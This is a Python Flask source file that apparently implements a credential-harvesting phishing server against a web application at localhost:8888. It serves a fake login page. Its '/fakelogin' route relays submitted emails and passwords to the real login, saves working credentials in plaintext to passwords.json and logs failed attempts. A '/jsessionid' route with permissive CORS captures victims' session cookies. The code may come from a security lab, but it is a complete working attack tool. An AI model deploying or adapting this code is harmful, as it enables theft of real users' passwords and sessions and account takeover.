import os
import json
import requests

from datetime import datetime
from flask import Flask, Response, request, render_template
from flask_cors import CORS, cross_origin

PASSWORDS_FILE = 'passwords.json'
if not os.path.exists(PASSWORDS_FILE):
    with open(PASSWORDS_FILE, 'w') as f:
        json.dump({}, f)

app = Flask(__name__)
cors = CORS(app, resources={r'/*': {'origins': '*'}}, CORS_SUPPORTS_CREDENTIALS=True)
app.config['CORS_HEADERS'] = 'Content-Type'


@cross_origin
@app.route('/jsessionid', methods=['POST'])
def jsessionid():
    date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    # Get the JSESSIONID cookie from the request
    sessionid = request.cookies.get('JSESSIONID')
    print(f"{date} - JSESSIONID: {sessionid}")

    response = Response(f"JSSESSIONID: {sessionid}")
    response.headers['Access-Control-Allow-Origin'] = 'http://localhost:8888'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response


@app.route('/fakelogin', methods=['POST'])
def fakelogin():
    email = request.get_json()['email']
    password = request.get_json()['password']
    search = "(<span>" + email + "</span>)"

    res = requests.get('http://localhost:8888')
    # Set-Cookie: JSESSIONID=E6B106D0EF41478B0751B44A8BF166CB; Path=/; HttpOnly
    set_cookie = res.headers['Set-Cookie']
    jsessionid = set_cookie.split(';')[0].split('=')[1]

    print(f"JSESSIONID: {jsessionid}")
    res = requests.post(
            'http://localhost:8888/login',
            data={'email': email, 'password': password, '_rememberMe': 'on'},
            cookies={'JSESSIONID': jsessionid}
        )

    print(f"Login status: {res.status_code}")

    if search in res.text:
        print(f"- Login successful for '{email}'")
        passwords = {}
        with open(PASSWORDS_FILE, 'r') as f:
            passwords = json.load(f)
            passwords[email] = password

        print(f"- Saving password for '{email}': {password}")
        with open(PASSWORDS_FILE, 'w') as f:
            json.dump(passwords, f, indent=4)
    else:
        print(f"- Wrong password for '{email}'")
        print(f"- Password: {password}")

        return Response(status=201) # 201: Just used to avoid the browser to display the error page

    response = Response(status=200)
    response.headers['Set-Cookie'] = set_cookie
    return response


@app.route('/login', methods=['GET'])
def login():
    return render_template('login.html')


if __name__ == "__main__":
    app.run()
